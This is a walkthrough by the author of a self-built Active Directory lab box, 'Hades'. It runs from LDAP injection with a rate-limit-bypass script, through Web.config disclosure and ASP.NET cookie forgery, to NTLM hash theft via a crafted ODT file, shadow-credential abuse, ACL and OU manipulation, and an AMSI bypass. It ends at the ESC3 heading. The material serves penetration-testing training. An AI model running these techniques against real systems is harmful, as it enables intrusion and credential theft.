
### Introduction

I initially started this box as a lab to help me learn active directory and kerberos related attacks, and in the process of building the box I took the opportunity to get familiar with building web applications in .NET. I based the theme of this box around Kerberos to showcase a clever trick you can use against Kerberos to abuse Resource Based Constrained Delegation against a Domain Controller, Hence the box name "Hades". Another theme I wanted to tie in with kerberos is "Password-less" authentication, where much of the users on this box are not compromised via their passwords but by stealthier tricks, eg: shadow credentials. There are two other cool attacks that I centred the box around. The first one is a lesser-known Active Directory attack related to moving users between OUs to abuse inherited ACLs. The other attack I devised while learning about Enrollment Agents in ADCS and wanted to show off the ESC3 attack. There's a lot of other cool things, so I'll just get right in.

### Key Processes 

- IIS is hosting a webserver `hades.htb` on port 443. 
- LibreOffice v24.8.2 is running in a Scheduled Task. 
- WinRM is configured for SSL connections and accepts certificate authentication over port 5986.

### Automations / Crons

There are three Scheduled Tasks on the box. Automated Tasks should start automatically.
##### View Reports:

This scheduled task runs as the user `natalie.a` which simulates her accessing the `Reports` share and opening a maliciously crafted ODT file through LibreOffice, allowing her NTLM hash to be stolen. It runs every 2 minutes by executing the script found at: `C:\Users\natalie.a\AppData\Local\Windows\View Reports.ps1`
##### Domain Cleanup:

Runs a general cleanup of the domain by removing any user created artifacts. It runs every 10 minutes by executing the script found at: `C:\Users\Administrator\AppData\Local\Windows\Domain Cleanup.ps1`
##### Password Cleanup

This is a special task that is not run automatically but instead can be triggered by users in the `IT Support` group. The idea behind this task is that it was created by the Domain Admins in response to a complaint made by the IT Team that they weren't able to reset user's passwords due to legacy artifacts that prevent Active Directory Inheritance. It allows the IT team to run a script found in `C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1` as a higher privileged user that will reset inheritance on users that IT have password reset permissions against. This is important in the exploit path when needing to take over accounts that have the `adminCount` property enabled. 

### Firewall Rules

There is a firewall rule that allows incoming and outgoing traffic on all ports within the 192.168.1.0/24 subnet, so I am able to communicate with the box.

### Docker

N/A

### Other

N/A

# Writeup

## Enumeration

### nmap

Running nmap against the box `nmap -p- --min-rate 10000 -sV -sC 192.168.1.250` a lot of ports open, so I've filtered it down to the most relevant ones:

```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://192.168.1.250/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hades.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hades.htb
| Subject Alternative Name: DNS:dc.hades.htb, DNS:hades.htb, DNS:HADES
| Not valid before: 2024-11-18T11:39:53
|_Not valid after:  2026-11-18T11:49:53
|_ssl-date: 2024-11-23T02:24:03+00:00; +17h59m33s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Hades Corp
| ssl-cert: Subject: commonName=hades.htb
| Subject Alternative Name: DNS:hades.htb
| Not valid before: 2024-11-18T11:39:56
|_Not valid after:  2034-11-18T11:49:57
|_ssl-date: 2024-11-23T02:24:02+00:00; +17h59m32s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc.hades.htb
| Subject Alternative Name: DNS:dc.hades.htb, DNS:hades.htb, DNS:HADES
| Not valid before: 2024-11-18T11:39:53
|_Not valid after:  2026-11-18T11:49:53
|_ssl-date: 2024-11-23T02:24:02+00:00; +17h59m32s from scanner time.
| tls-alpn: 
|_  http/1.1
```

- Port **80** is serving a Microsoft IIS server which is redirecting to `https://192.168.1.250`
- Port **389** is running LDAP and confirms this is a Domain Controller with the hostname `hades.htb`. It also shows the FQDN `dc.hades.htb`. I'll add both to `/etc/hosts`. Anonymous binds are disabled, so no further information can be extracted here.
- Port **443** is serving IIS.
- Port **445** is SMB. I don't have creds at the moment and guest enumeration is disabled.
- Port **5986** is an alterrnative port for WinRM which allows connections over HTTPS. 

# Website

When accessing the site I'm automatically directed over to `https://hades.htb` showing a company home page:

![alt](resources/Pasted%20image%2020241122184720.png)

Wappalyzer reveals that this is a ASP.NET application, but it doesn't give us version information:

![alt](resources/Pasted%20image%2020241125223302.png)

I'll run gobuster to get a directory listing on the site: 
```bash
gobuster dir -u https://hades.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt --no-tls-validation
```
![alt](resources/Pasted%20image%2020241122190559.png)

It finds a few directories. The ones that stand out are `/login` and `/home`. Trying to access home redirects me to login, so I'll probably need to authenticate first. Navigating over to login shows a simple login page:

![alt](resources/Pasted%20image%2020241122191009.png)

There's a hint that tells us requests on the page are rate limited. This is useful to know if we need to do bruteforcing:

![alt](resources/Pasted%20image%2020241122191202.png)

Since I don't have any credentials or usernames to try, I can attempt default creds like `admin:admin` or `root:root` however these both fail.   

### Form Fuzzing

I'll capture the request in burpsuite and do some fuzzing against the page. The first thing I notice is there's a regex filter on the username field: ``^[^!"#&'()* ,\:;<=>?[\]^`{|}~] $``

![alt](resources/Pasted%20image%2020241122192517.png)

Trying simple SQL injection like `admin -- OR 1=1` is blocked and returns a `Invalid Username` message. Looking at the block list I can see the `%` character isn't blocked. This means I could bypass it with url encoding. Normal url encoding is still blocked but double url encoding the string like so: `admin%2520--%2520OR%25201%253D1` gives me the regular login attempt message:

![alt](resources/Pasted%20image%2020241122193520.png)

There's no SQL injection, so I'll bruteforce a list of special characters against the username field to see if any of them give a different response from the site. To do that I'll run a python script to convert the characters into a format that will bypass the filter:

```python
import urllib.parse
with open("/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt", "r") as chars:
	for char in chars:
		char = char.strip()
		encode = urllib.parse.quote(char)
		encoded_2 = urllib.parse.quote(encode)
		print(encoded_2)
```

Then I'll save the burpsuite request to a file, `login.req` and replace the username field with "FUZZ". Now I can run ffuf:
```bash
ffuf -request login.req -w encoded-chars.txt -u https://hades.htb/login -p 2 -t 1
```
This still hits the rate limit, but I notice that some characters are showing different results:

![alt](resources/Pasted%20image%2020241122215426.png)

the characters are `~  *  (`.  The first one is being blocked by the filter, returning the `Invalid Username` error, but `*` returns a new message:

![alt](resources/Pasted%20image%2020241122215840.png)

This is different to the `Invalid login attempt` message observed earlier. In comparison, `(` appears to return no message, and silently fails. 
### Ratelimit Bypass

The form's behaviour suggests its vulnerable to ldap injection. We'll need to do bruteforcing for that, so getting around the rate-limit is the first step. The candidate responsible for limiting our requests is probably the `__RequestVerificationToken` which is present in the request below:

```ruby
POST /Login HTTP/2
Host: hades.htb
Cookie: __RequestVerificationToken=I6nvF6z3TcAGiDoLK15C1llrz5uuxslPr6k15O3nojGgspYHCEbLatnO0u5w3H5y9FItcRaQ0quFFAYbleppMegqlpeaFpa3OoynTfV-TEE1
Content-Length: 182
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36

__RequestVerificationToken=4KoH65wv5Jbn9t65Zw3I2Ksqv57eUTGWirycNjhww4B73HWLRjnFT1E6FgxGw4Mv12mGCXbnnKmzj1hGfHqUv2T40NQGtuhqwtudukruHJo1&Username=admin&Password=admin&RememberMe=false
```

Tampering with this token will return a 500 Internal Server Error, so we cant send fake tokens to bypass the rate-limit. According to [Microsoft Documentation](https://learn.microsoft.com/en-us/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks) `__RequestVertificationToken` is used to prevent Cross-Site Request Forgery attacks by generating a random token with each request that is bound to the session cookie and embedded in a hidden field of the request. When the server detects that an invalid token has been sent it will reject that request.

The `Cookie:` field is tied to the session, so if we open and close our browser and navigate back to the page we'll get a new Cookie:

```ruby
POST /Login HTTP/2
Host: hades.htb
Cookie: __RequestVerificationToken=eTpU7lsPbfM2AaWqWpHfioGlGK-RGVumfR2L0DIssXofV3yCa9NCQpOqenJ0mW6lsfpOJ6iV9fwjldE67dw_D6hIFYmqs18dHEtEhAvd7VQ1
Content-Length: 190
```

However the problem remains that if we generate a new cookie we must also update the token we send in the request to one that the server has bound to our new cookie. The documentation states that with each new request the server will generate a random token that will be embedded within the input field of the page, meaning we simply need to change the value we send in the request to reflect the new one:

![alt](resources/Pasted%20image%2020241122232923.png)

![alt](resources/Pasted%20image%2020241122232944.png)

This process of generating a token key pair can be automated in python, which will provide us with the groundwork for bypassing the rate-limit:

```python
import requests
import urllib3
from bs4 import BeautifulSoup
import urllib.parse
import time
urllib3.disable_warnings()
url = "https://hades.htb/login"

class newSession:
	def __init__(self, token=None, cookie=None, data=None):
		self.token = token
		self.cookie = cookie
		self.data = data
	
	def renew(self):
		session = requests.Session()
		response = session.get(url, verify=False)
		soup = BeautifulSoup(response.text, 'html.parser')
		token = soup.find("input", {"name": "__RequestVerificationToken"})
		cookie = session.cookies.get("__RequestVerificationToken")

		self.token = token['value']
		self.cookie = {"__RequestVerificationToken":cookie}
	
	def post(self, payload):
		self.data = {
			"__RequestVerificationToken":self.token, 
			"Username":payload, 
			"Password":"a"
		}
		r = requests.post(
			url=url, cookies=self.cookie, data=self.data, verify=False
		)
		return r

session = newSession()
session.renew()

while True:
	r = session.post("FUZZ")
	if(r.status_code == 429): # too many requests
		session.renew()
		print("renewing session")
	else:
		print(r.status_code)
		time.sleep(0.5)
```

### LDAP Injection

LDAP has a number of field attributes, as shown [here](https://activedirectorypro.com/ad-ldap-field-mapping/). I'll make a wordlist of fields from this site and modify the script to iterate over them:

```python
with open("ldap_fields.txt", "r") as fields:
	for field in fields:
		field = field.strip()
		payload = urllib.parse.quote(f"*)({field}=*")
		r = session.post(payload)
		if(r.status_code == 429):
			session.renew()
			r = session.post(payload)

		if("Login attempt failed" in r.text):
			print(field)
```

The script identifies that `givenName, sn, displayName, description, telephoneNumber, userPrincipalName, sAMAccountName` and `department` contain user data. Now I'll modify the script to enable me to query each of these fields to see the data present. The full version of this script is attached with the writeup.

The `department` field looks like it stores some generic user roles on the website:

![alt](resources/Pasted%20image%2020241125200241.png)

Knowing about these roles will be useful later. Occasionally administrators may leave passwords in the `description` field for safe keeping, unawares of the security vulnerability:

![alt](resources/Pasted%20image%2020241125194404.png)

`change*th1s_p@ssw()rd!!` matches a credential. We don't know who's password this is, so we have to enumerate a list of users from ldap by querying the `sAMAccountName` field:

![alt](resources/Pasted%20image%2020241125164530.png)

I'll save this list and perform a password spraying attack against them with the previously captured credential. Before doing that though, I'll setup `/etc/krb5.conf` to enable us to authenticate to the domain using kerberos:

```ruby
[libdefaults]
    default_realm = HADES.HTB
[realms]
    HADES.HTB = {
      kdc = dc.hades.htb
    }
[domain_realm]
    .hades.htb = HADES.HTB
    hades.htb = HADES.HTB
```

Now I'll run [NetExec](https://github.com/Pennyw0rth/NetExec):
```bash
netexec smb -k dc.hades.htb -u users.txt -p 'change*th1s_p@ssw()rd!!' --continue-on-succes
```
![alt](resources/Pasted%20image%2020241125195534.png)

It matches against the user `ken.w`. Testing these creds against the login page successfully authenticates me:

![alt](resources/Pasted%20image%2020241125201119.png)

### Privesc on Website

Enumerating the dashboard reveals a few user forms and messages. An interesting one is the Forms page, which allows me to upload files to the server:

![alt](resources/Pasted%20image%2020241125225957.png)

Unfortunately the account I've compromised doesn't have upload permissions, so I'll need to escalate my privileges first. 

The other form that sticks out is `Downloads`. This form allows me to download files from the server. I'll capture the request in burpsuite and test for file disclosure:

```ruby
GET /Home/Download?fileName=rejection.pdf HTTP/2
Host: hades.htb
Cookie: __RequestVerificationToken=LQMEyBjgmnH75d7qA1DFABAWSIEjeWItnmddx_xd_IyflRjLv2HDOeWIBKYU_WoQhuuzXXhJXWr9ntHqEv0iA9xLuXvxIEvXd-sXa_WxV8I1; .ASPXAUTH=734119AC747578CCA65B2A2DE9DD442543C476F30207E4418076158EAE2C874615A38AA8ECC390841E83DC797AA751495987836552BC6608F7D95626C76F81E731B2A812C465796A722A6A5E1D563945429645FB6E6B140519EAB9074368A7EF7BD22DDBFB3D9FA886A8DB4B65D58E6897FEA831DB3F76082AD9BB2E562E66149B9A930E857CC3049D010A92B39C4257DB5557721DE43EB52EA507A0A96D6970
```

`?fileName=` looks like a classic parameter that can be abused. Earlier in our enumeration we caught that this was a Microsoft ASP.NET application, which stores much of its sensitive configurations inside Web.config. I'll attempt to read it like so:

```ruby
GET /Home/Download?fileName=../../Web.config HTTP/2
```

This successfully discloses the configuration:

```ruby
HTTP/2 200 OK
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename="../../Web.config"
Content-Length: 4896

<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <system.Web>
	<httpRuntime targetFramework="4.8.1" />
  </system.Web>
```

This file reveals great detail about the application, such as the framework its built on and that this is an MVC application, but most importantly there's machine keys:

```xml
<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

We also confirm the application is using forms authentication:

```xml
<authentication mode="Forms">
    <forms protection="All" loginUrl="/Login" path="/" />
</authentication>
```

This means that the cookie it uses to authenticate us, namely `.ASPXAUTH` is signed using the machine key. Now that we possess this key, it is possible for us to forge our own cookies to authenticate as any user on the application. 

[This](https://github.com/liquidsec/aspnetCryptTools)GitHub repository has a simple project we can build in .NET to decrypt forms authentication cookies. I'll head over to a Windows VM and follow the build instructions in the repo, making sure to include the captured machine key in the `app.config` of the project:
```xml
<?xml version="1.0"?>
<configuration>
	<system.web>
		<compilation debug="false" targetFramework="4.8" />
		<machineKey 
			decryption="AES"
			validation="HMACSHA256" 
			decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5
			861EDAE4CCC6B019581"
			validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC7
			3822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DE
			F96B553A022F1BA56A18B80" 
		/>
	</system.web>
</configuration>
```

Now I'll copy and build the code from `FormsDecrypt.cs`, and supply it with the security blob contained inside the `.ASPXAUTH` session cookie: 
```powershell
.\CookieDecrypt.exe "734119AC747578CCA65B2A2DE9DD442543C476F30207E4418076158EAE2C874615A38AA8ECC390841E83DC797AA751495987836552BC6608F7D95626C76F81E731B2A812C465796A722A6A5E1D563945429645FB6E6B140519EAB9074368A7EF7BD22DDBFB3D9FA886A8DB4B65D58E6897FEA831DB3F76082AD9BB2E562E66149B9A930E857CC3049D010A92B39C4257DB5557721DE43EB52EA507A0A96D6970"
```

And it successfully decrypts the cookie:

![alt](resources/Pasted%20image%2020241126184610.png)

Its issued to `ken.w` for 10 minutes. The Data field matches one of the departments (`Web Users`) we enumerated earlier from ldap. I'll test if changing the value to `Web Administrators` gives me access to the upload form. To do that I'll copy the code from `FormsEncrypt.cs` and rebuild the project with some minor changes:

```c#
using System;
using System.Web.Security;
namespace FormsEncryptor
{
    class Program
    {
        static void Main()
        {
            FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(
                1, "ken.w", DateTime.Now, DateTime.Now.AddMinutes(9999), true, 
                "Web Administrators", "/"
            );
            string encTicket = FormsAuthentication.Encrypt(ticket);
            Console.WriteLine(encTicket);
            Console.Read();
        }
    }
}
```

Running it successfully generates a new `.ASPXAUTH` token to use with the site:
```powershell
"BD7770F0BF9E40C49B74D171E9A14B921B5028C277AB578D3EE685E0F54080F76BB57EE304C9DB58DBA09ED911E7714EC78DB77BAF9B4FE76C88CED72398560BEF5C9B5C17D01434DEE126CB4813BD53EE36CB34BABE9EA79F5E148E96D9DD4D03136ECD64746E2B36F4C56013EE0D5D6D3D4CCD00DC1C1D56AA81662765000063F66EEE576A37C89C40BD22A2D5F1519C02A6BBAB6D27E0873EE8F093FA05FC19B2C792B9C765361E73C7382F0094C9"
```

I'll replace my current session cookie with the value above and see that I'm re-authenticated to the application.
### Auth as Natalie

Uploading files now gives me a different error from before:

![alt](resources/Pasted%20image%2020241126191757.png)

Most common file types like `.txt` or `.png` are blocked. Since this is a reports submission form, extensions that don't match against common document format are likely to fail. Re-uploading the file as a  `.docx` confirms this theory:

![alt](resources/Pasted%20image%2020241126192241.png)

chatGPT provides a useful list of file formats similiar to `.docx`:

![alt](resources/Pasted%20image%2020241126192918.png)

All of these except for `.odt` are blocked by the filter, meaning that we are dealing with either a libreoffice or microsoft word client behind the form. 

Judging from some of `ken.w`'s emails phishing seems to be problem on this application, so I'll try to steal NTLM hashes through a malicious file upload. First I'll make a new file in Libreoffice and add an OLE object pointing to an image file on my box. This will make it easier to find when we modify the configuration file:

![alt](resources/Pasted%20image%2020241126194914.png)

Save the file as `ODF Text Document (.odt)`. ODT files are really just zips containing xml content, so I'll extract the newly created file with `unzip ken_report.odt`:

![alt](resources/Pasted%20image%2020241126195457.png)

Now I'll open `content.xml` and navigate to the line matching the OLE object I created before:

![alt](resources/Pasted%20image%2020241126195823.png)

I'll change this to make a reference to a random directory on my box: `file://192.168.1.1/pwn`. Now I'll save the file and zip it back up into a `.odt` again: 
```bash
zip ken_report.odt -r *
```

A tool like [Responder](https://github.com/SpiderLabs/Responder) can be used so that when the target reaches back out to my server it'll send their NTLM challenge/response hash, which I can crack to recover their password. I'll upload the malicious file to the reports panel and then start Responder: `sudo ./Responder.py -I wlo1`. About a minute later I receive a response:

![alt](resources/Pasted%20image%2020241126201543.png)

Now running hashcat:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

This cracks, giving me the password: `natalie.a:Prettyprincess123!`

# Shell as Auditor

### Enumerate Shares

To enumerate shares on the box I'll use netexec again: 
```bash
netexec smb dc.hades.htb -k -u natalie.a -p 'Prettyprincess123!' --shares
```
![alt](resources/Pasted%20image%2020241126220748.png)

I can access shares by running:
```bash
smbclient //dc.hades.htb/<share> -U natalie.a -N
```

Most of the shares don't provide any useful info, except `Department`:
![alt](resources/Pasted%20image%2020241126222324.png)

The folders are empty, but they provide an idea to how the domain is structured. The IT share contains what looks like an email file and a shortcut link:

![alt](resources/Pasted%20image%2020241126222303.png)

I'll download both files with `get <file>`. Running strings against the link shows its running a powershell script located in the home folder of `ashley.b`:

![alt](resources/Pasted%20image%2020241126223111.png)

The email says that the purpose of this script is to provide the `IT Support` team assistance in resetting user passwords. I'll keep this in mind for later if I can compromise a member of this group. Right now I only have read access to the share, so I can't exploit it from here. 
### Bloodhound Enumeration

I'll enumerate natalie's permissions in Active Directory by running [Bloodhound](https://github.com/dirkjanm/BloodHound.py): 
```bash
bloodhound-python -k -c All -u natalie.a -p 'Prettyprincess123!' -d hades.htb -dc dc.hades.htb
```

Now starting bloodhound's GUI interface with:
```bash
sudo neo4j console
sudo ./Bloodhound --no-sandbox
```

Then I can upload the data:

![alt](resources/Pasted%20image%2020241126224440.png)

Under "Node Info" I'll mark `natalie.a` as owned and enumerate what she has access to. The `Web Support` group stands out:

![alt](resources/Pasted%20image%2020241126225145.png)

`Web Support`has `Generic Write` against a number of users within the `Web Department` OU:

![alt](resources/Pasted%20image%2020241126225753.png)

None of these users have interesting permissions, so I'll back-trace a bit. From nmap enumeration we found that winrm was enabled on this box, meaning compromising a user with the `CanPSRemote` privilege will allow powershell logins. Under "Shortest Paths to Unconstrained Delegation Systems", Bloodhound detects two such users:

![alt](resources/Pasted%20image%2020241127133914.png)

There's some non-default Helpdesk groups that can change their passwords, but I don't have access to any of these groups. I'll have to dig deeper. 
### Enumerate ACLs

I can use a tool like [Powerview](https://github.com/aniqfakhrul/powerview.py) to manually enumerate Access Control Lists (ACLs) against objects in Active Directory:
```bash
powerview -k hades.htb/natalie.a:'Prettyprincess123!'@dc.hades.htb
```
![alt](resources/Pasted%20image%2020241127134845.png)

Now that I'm connected, I can run:
```powershell
Get-ObjectAcl -Identity auditor -Select SecurityIdentifier
```

 This will filter for a list of objects that have permissions against the `auditor` user. Scrolling through the list I notice a group I saw earlier in Bloodhound, `Recruitment Managers`:

![alt](resources/Pasted%20image%2020241127135132.png)

I'll search for ACLs on `auditor` that match this group:
```powershell
Get-ObjectAcl -Identity auditor -Where "SecurityIdentifier contains Recruitment Managers"
```
![alt](resources/Pasted%20image%2020241127135402.png)

`Write Property` doesn't explain much, but a quick google search of the `ObjectAceType` GUIDs shows that these permissions match [WriteRDN](https://learn.microsoft.com/en-us/windows/win32/adschema/a-name) and [WriteCN](https://learn.microsoft.com/en-us/windows/win32/adschema/a-cn). These permissions look like they are inherited from the parent container, so I'll see if `Recruitment Managers` has extra permissions there:
```powershell
Get-ObjectAcl -Identity "Security Department" -Where "SecurityIdentifier contains Recruitment Managers"
```
![alt](resources/Pasted%20image%2020241127140653.png)

Summarising our findings, `Recruitment Managers` has the ability to write to the Relative Distinguished Name (RDN) and Common Name (CN) attributes of objects within the `Security Department`. We also discovered they have the ability to create or delete objects in the parent container. According to this [Article](https://learn.microsoft.com/en-us/answers/questions/948724/delegate-move-object-in-active-directory-using-pow), Having these permissions grants the ability to move users between OUs (Departments). 
### WinRM Access

To abuse this we'll need to find another Department that `Recruitment Managers` can move objects in. Thinking back, we've compromised a member of the `Web Support` team (`natalie.a`) and this group has `Generic Write` over users within the `Web Department`. This means our inherited permissions from Natalie should apply down to any user we move into that department.

If we check the permissions against `Web Department`:
```powershell
Get-ObjectAcl -Identity "Web Department" -Where "SecurityIdentifier contains Recruitment Managers"
```

We find that `Recruitment Managers` has the same object moving privilege here:

![alt](resources/Pasted%20image%2020241127141900.png)

Now we just need to compromise a user in the `Recruitment Managers` group. Our earlier bloodhound enumeration showed that the `Web Support` group has `Generic Write` against `bob.w`, which happens to be a member of this group. The "Generic Write" privilege against a user lets you perform two attacks against them:

- Write an SPN and perform targeted kerberoasting
- Add a [Shadow Credential](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials)

The first attack relies on the user's password being crackable, so a reliable approach is to add a shadow credential, which directly grant us a kerberos ticket  without needing to know their password. To abuse this I'll use [Certipy](https://github.com/ly4k/Certipy): 
```bash
certipy shadow add -k -u natalie.a@hades.htb -account bob.w -target dc.hades.htb
```
![alt](resources/Pasted%20image%2020241127143014.png)

Now I can authenticate and receive a ticket:
```bash
certipy auth -pfx bob.w.pfx -username bob.w -domain hades.htb
```
![alt](resources/Pasted%20image%2020241127143629.png)

I'll export the ticket to my environment and connect to Powerview as the newly compromised user:
```bash
export KRB5CCNAME=bob.w.ccache
powerview -k hades.htb/bob.w@dc.hades.htb --no-pass
```
![alt](resources/Pasted%20image%2020241127144437.png)

With bob under our control we can now proceed to move the `auditor` user over to the Web Department where Natalie has control:
```powershell
Set-ADObjectDN -Identity auditor -DestinationDN "OU=Web Department,OU=DCHADES,DC=hades,DC=htb"
```
![alt](resources/Pasted%20image%2020241127144853.png)

Now that Auditor is in our attack range, I can perform the same shadow credential attack from earlier:
```bash
certipy shadow add -k -u natalie.a@hades.htb -account auditor -target dc.hades.htb

certipy auth -pfx auditor.pfx -username auditor -domain hades.htb
```

Be aware that there is a cleanup script that runs every 10 minutes for this step, so if you receive errors, restart the process. If successful, we'll obtain a kerberos ticket for `auditor`:

![alt](resources/Pasted%20image%2020241127145435.png)

Normally at this stage we'd be able to access winrm normally using the kerberos ticket, but remembering our enumeration on nmap, winrm is configured to listen over SSL on this box:

![alt](resources/Pasted%20image%2020241127145814.png)

However, If we try over SSL, it'll still fail:
```bash
evil-winrm -i dc.hades.htb -r hades.htb -S -u auditor -p 'nopass'
```
![alt](resources/Pasted%20image%2020241127150316.png)

The current build of evil-winrm does not support Kerberos authentication over SSL, and will fallback to NTLM if specified. Because NTLM is disabled on this domain, authentication will fail. [This] (**haven't done this yet, waiting for approval**) pull request on git-hub provides a simple change we can make to `evil-winrm.rb` to enforce kerberos authentication over SSL:

```ruby
if $ssl
	$conn = if $pub_key && $priv_key
				# keys supplied, use cert auth
			elsif !$realm.nil?
				# try kerberos if realm specified and no cert keys provided
				WinRM::Connection.new(
					endpoint: "https://#{$host}:#{$port}/#{$url}",
					user: '',
					password: '',
					transport: :kerberos,
					realm: $realm,
					no_ssl_peer_verification: true,
					user_agent: $user_agent
				)
			else
				# fall back to NTLM
			end
```

Now if I can run the following to successfully login and obtain `user.txt`:
```bash
evil-winrm -S -i dc.hades.htb -r hades.htb
```
![alt](resources/Pasted%20image%2020241127151757.png)

#### *Side Note*

Players could also use their kerberos ticket to enroll in the `User` template, which supports Client Authentication. With this certificate you would then extract the cert and private key and supply this to evil-winrm instead of using kerberos. I'll demonstrate this later when we compromise another user. 

# Lateral Movement

### Identify Attack Paths

With a foothold on the domain I'll run bloodhound again, this time as Auditor and identify any privileges they have which might let us privesc:
```bash
bloodhound-python -c All -k -u auditor -d hades.htb -dc dc.hades.htb
```

Now I'll upload the data again, and mark Auditor as owned. Then in Node info I'll look for paths to the domain controller from this user:

![alt](resources/Pasted%20image%2020241128192919.png)

I'll un-tick the `CanPsRemote` edge in the filter settings, as I've already abused this edge to get into the box. Running the new query identifies another path:

![alt](resources/Pasted%20image%2020241128185634.png)

Auditor is a member of `Forest Management` which has `Generic All` against the `Forest Migration` Department, which contains the `IIS_Administrator` user. This means we can perform the Descendant Object Takeover (DOT) attack to compromise them. To do this I'll use a tool called [bloodyAD](https://github.com/CravateRouge/bloodyAD) and run the following command:
```bash
bloodyAD -k -u auditor -d hades.htb --host dc.hades.htb add genericAll "OU=Forest Migration,OU=DCHADES,DC=hades,DC=htb" auditor
```
![alt](resources/Pasted%20image%2020241127222644.png)

Now I should have Full Control over `IIS_Administrator`, so I can do high privileged things like changing its password. To be stealthy I'll go with the previously used tactic of adding a shadow credential and getting a kerberos ticket for it:
```bash
certipy shadow add -k -u auditor@hades.htb -account IIS_Administrator -target dc.hades.htb
```

This attempt results in an error:
```bash
[-] Could not update Key Credentials for 'iis_administrator' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

I'll try look for another user in the OU and test if the command works against them:
```powershell
Get-ADUser -Filter * -SearchBase "OU=Forest Migration,OU=DCHADES,DC=hades,DC=htb"
```

I'll select the user `james.s` and retry the same command from before. I can see that this time its successful:
```bash
[*] Successfully added Key Credential with device ID '0cb7eb7d-0f14-1c9d-3137-74bc60337b6b' to the Key Credentials for 'james.s'
[*] Saved certificate and private key to 'james.s.pfx
```

This means that something must be blocking my permissions against `IIS_Administrator`. Looking at user properties in Bloodhound I notice the account has `adminCount` set to True:

![alt](resources/Pasted%20image%2020241128195934.png)

[adminCount](https://techcommunity.microsoft.com/blog/askds/five-common-questions-about-adminsdholder-and-sdprop/396293) is used in Windows environments to protect privileged users by disabling risky security features like parent-container ACL inheritance. This means that even if we apply a malicious ACL on `Forest Migration` it will not be inherited by users with adminCount enabled.
### Enumerate ADCS

I'll take a step back and do some further enumeration. Active Directory Certificate Services (ADCS) is present on the domain. With a foothold on box I can use `Certify.exe` to get a better idea of the templates on the server. Defender is active on the box, but I can use evil-winrm to load binaries into memory. First I'll make a copy of Certify to my current working directory, then run:
```bash
evil-winrm -S -i dc.hades.htb -r hades.htb -e .
```

This will enable 'extensions' in winrm. Next I'll need to Bypass AMSI:

![alt](resources/Pasted%20image%2020241127211929.png)

With AMSI patched I can use Invoke-Binary to run Certify on the box without being detected by AV:

![alt](resources/Pasted%20image%2020241127212104.png)

Now I can run `Invoke-Binary Certify.exe 'find, /vulnerable'` to look for vulnerable templates. It ends up not finding anything, but it picks up an interesting configuration on the Certificate Authority:

![alt](resources/Pasted%20image%2020241127212633.png)

Members of the `Smartcard Operators` group are allowed to enroll for any certificate template on behalf of the `Domain Employees` group. Additionally, `Smartcard Operators` are allowed to enroll in the `EnrollmentAgent` certificate template:

![alt](resources/Pasted%20image%2020241127213026.png)
### Compromising Smartcard Operators

The identified permissions on the `Smartcard Operators` group correspond to the ADCS [ESC3](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/) attack. I'll head back over to bloodhound and look for an attack path to this group:

![alt](resources/Pasted%20image%2020241128202040.png)

It finds an attack path stemming from the same OU we identified earlier, `Forest Migration`:

![alt](resources/Pasted%20image%2020241127215402.png)

Fortunately, Fernando does not have the adminCount property enabled, meaning we can perform the Descendant Object Takeover attack we tried earlier against him:

![alt](resources/Pasted%20image%2020241128202311.png)

I'll run bloodyAD:
```bash
bloodyAD -k -u auditor -d hades.htb --host dc.hades.htb add genericAll "OU=Forest Migration,OU=DCHADES,DC=hades,DC=htb" auditor
```

And now I'll add a shadow credential:
```bash
certipy shadow add -k -u auditor@hades.htb -account fernando.r -target dc.hades.htb
```

It runs successfully:
```bash
[*] Successfully added Key Credential with device ID 'f2891f00-6960-c7a2-98fc-33ef46ecb4dd' to the Key Credentials for 'fernando.r'
[*] Saved certificate and private key to 'fernando.r.pfx'
```

Now before I do any authentication as Fernando I'll need to enable his account first. In my powershell session as auditor I'll run:
```powershell
Enable-ADAccount -Identity fernando.r
```

This proceeds without any errors. Now I can attempt to authenticate as him and receive a kerberos ticket:
```bash
certipy auth -pfx fernando.r.pfx -username fernando.r -domain hades.htb
```
![alt](resources/Pasted%20image%2020241127222335.png)
### Abuse ESC3

